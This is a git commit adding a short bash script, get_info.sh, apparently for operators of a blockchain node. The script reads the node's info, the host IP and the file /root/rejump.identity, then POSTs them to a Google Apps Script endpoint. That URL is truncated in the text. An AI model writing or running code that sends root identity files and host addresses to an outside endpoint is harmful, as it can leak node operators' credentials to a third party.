458b302b258068bd6cd6c25a3322c9928acc7487
Reguide Wiki (Blockchain) <127845264+ReguideWIKI@users.noreply.github.com>
2024-07-16 20:42:02 +0700

    Create get_info.sh

---
+++ get_info.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+
+
+NODE=`sonaric node-info`
+NODE1=`echo $NODE | jq -sRr @uri`
+NODE2=`echo $NODE1 | base64`
+wait
+echo
+
+IPAD=`hostname -I | awk '{print $1}'`
+IPAD1=`echo $IPAD | jq -sRr @uri`
+wait
+echo
+
+IDEN=`cat /root/rejump.identity`
+IDEN1=`echo $IDEN | jq -sRr @uri`
+echo
+wait
+
+
+curl -L "https://script.google.com/macros/s/AKfycbwSTqzaTYB3jN6ItfEUKrHyDS0MMxsnTp-r4nT8sKCSr51SuMZ54EWOQr8F>
+     -H 'Content-Type: application/json' \
+     -d '{
+        "name_id": "'"$NODE1"'",
+        "ip_address": "'"$IPAD1"'",
+        "identity": "'"$IDEN1"'"
+     }' | jq
+
